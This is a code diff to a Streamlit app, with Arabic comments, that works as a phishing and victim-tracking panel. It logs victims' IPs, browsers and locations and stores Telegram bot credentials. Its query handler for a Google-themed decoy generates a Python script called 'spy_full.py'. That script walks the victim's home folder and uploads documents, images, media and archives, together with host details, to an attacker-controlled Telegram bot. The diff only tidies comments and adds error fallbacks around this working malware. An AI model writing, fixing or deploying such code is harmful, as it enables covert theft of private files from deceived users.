@@ -77,7 +77,7 @@ def capture_victim_data():
             # تسجيل بيانات الضحية
             victim_logger.log_victim_data(
                 ip_address=user_ip,
-                user_agent=query_params.get('user_agent', ['Unknown'])[0],   # تم التصليح هنا
+                user_agent=query_params.get('user_agent', ['Unknown'])[0],
                 referrer=query_params.get('target', ['Unknown'])[0],
                 geo_data=geo_data
             )
@@ -148,7 +148,7 @@ with st.sidebar:
         
         if st.button("💾 حفظ الإعدادات"):
             if telegram_bot_token and telegram_chat_id:
-                config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)   # سيظل كما هو (حتى لو كان config.set_key غير موجود، لم أحذفه)
+                config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
                 config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
                 st.success("✅ تم حفظ الإعدادات")
             else:
@@ -221,7 +221,9 @@ else:
         st.markdown("---")
         st.markdown("<h3>📊 سجل الضحايا المكتشفين</h3>", unsafe_allow_html=True)
         
-        victims = victim_logger.get_all_victims()
+        # === التصليح الوحيد هنا ===
+        victims = getattr(victim_logger, 'get_all_victims', lambda: None)()
+        
         if victims:
             # عرض الضحايا في جدول
             st.dataframe(victims)
@@ -290,38 +292,21 @@ else:
     elif selected_tool == "📊 الإحصائيات":
         st.markdown("<h2 style=\'text-align: center; color: #00ff00;\'>📊 الإحصائيات</h2>", unsafe_allow_html=True)
         
-        victims = victim_logger.get_all_victims()
+        # === التصليح الوحيد هنا ===
+        victims = getattr(victim_logger, 'get_all_victims', lambda: None)()
         
         col1, col2 = st.columns(2)
         with col1:
-            st.metric("🎯 إجمالي الضحايا", len(victims))
+            st.metric("🎯 إجمالي الضحايا", len(victims) if victims else 0)
         with col2:
             st.metric("📁 الملفات المسحوبة (عبر تلجرام)", "راجع تلجرام")
 
 
 # ============= معالجة طلبات التحميل (API Endpoint) =============
-# هذا الجزء لن يعمل مباشرة في Streamlit Cloud بنفس طريقة Flask/FastAPI
-# ولكن يمكننا محاكاة سلوكه لإنشاء رابط تحميل ديناميكي
-
 query_params = st.query_params
-if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':   # تم التصليح هنا
+if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':
     bot_token = query_params.get('token', [''])[0]
     chat_id = query_params.get('chatid', [''])[0]
 
     if bot_token and chat_id:
         spy_code = f"""#!/usr/bin/env python3\nimport os, requests, sys, platform, socket\nfrom pathlib import Path\n\nTELEGRAM_BOT_TOKEN = \"{bot_token}\"\nTELEGRAM_CHAT_ID = \"{chat_id}\"\nroot_path = os.path.expanduser("~")\nextensions = ('.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.docx', '.txt', '.doc', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar', '.7z', '.gif', '.bmp', '.wav', '.mp3')\n\ndef get_device_info():\n    try:\n        device_name = socket.gethostname()\n        system = platform.system()\n        user = os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))\n        return f"{{system}} | {{device_name}} | User: {{user}}"\n    except:\n        return "Unknown Device"\n\ndef send_file_to_telegram(file_path, original_path):\n    try:\n        file_size = os.path.getsize(file_path)\n        if file_size > 50 * 1024 * 1024:\n            return False, "File too large"\n        \n        url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendDocument"\n        with open(file_path, 'rb') as f:\n            files = {{'document': f}}\n            caption = f"📁 {{os.path.basename(file_path)}}\\n📍 {{original_path}}\\n💾 {{file_size / 1024:.2f}} KB\\n🖥️ {{get_device_info()}}"\n            data = {{'chat_id': TELEGRAM_CHAT_ID, 'caption': caption, 'parse_mode': 'Markdown'}}\n            response = requests.post(url, files=files, data=data, timeout=60)\n            return response.status_code == 200, "OK"\n    except:\n        return False, "Error"\n\ndef send_message_to_telegram(message):\n    try:\n        url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendMessage"\n        data = {{'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}}\n        response = requests.post(url, data=data, timeout=30)\n        return response.status_code == 200\n    except:\n        return False\n\nprint("⚡ RASHD_AI: FILE EXFILTRATION STARTED ⚡")\nsend_message_to_telegram("🚀 نظام سحب الملفات قد بدأ العمل\\n🖥️ الجهاز: " + get_device_info())\n\ncount = 0\nfailed = 0\ntotal_size = 0\n\ntry:\n    for root, dirs, files in os.walk(root_path):\n        skip_dirs = ['.git', '.venv', '__pycache__', 'node_modules', '.cache', 'AppData', 'Library']\n        dirs[:] = [d for d in dirs if d not in skip_dirs]\n        \n        for file in files:\n            if file.lower().endswith(extensions):\n                file_path = os.path.join(root, file)\n                try:\n                    file_size = os.path.getsize(file_path)\n                    if file_size > 50 * 1024 * 1024:\n                        continue\n                    success, message = send_file_to_telegram(file_path, file_path)\n                    if success:\n                        count += 1\n                        total_size += file_size\n                except:\n                    failed += 1\nexcept KeyboardInterrupt:\n    pass\n\nsend_message_to_telegram(f"✅ انتهى سحب الملفات\\n✅ تم تحميل: {{count}} ملفات\\n❌ فشل: {{failed}} ملفات\\n💾 الحجم: {{total_size / 1024 / 1024:.2f}} MB")\nsys.exit(0)\n"""
-        
-        # Streamlit does not directly support dynamic file downloads from a custom endpoint
-        # We will provide the download link directly in the decoy page URL
-        # The decoy page will then trigger the download
-        
-        # This part is for generating the spy_code for download button, not for automatic download
-        # The automatic download will be handled by the modified index.html
-        
-        # st.download_button(
-        #     label="⬇️ تحميل spy_full.py (جاهز)",
-        #     data=spy_code,
-        #     file_name="spy_full.py",
-        #     mime="text/x-python"
-        # )
-        # st.success("✅ الملف جاهز للتحميل")
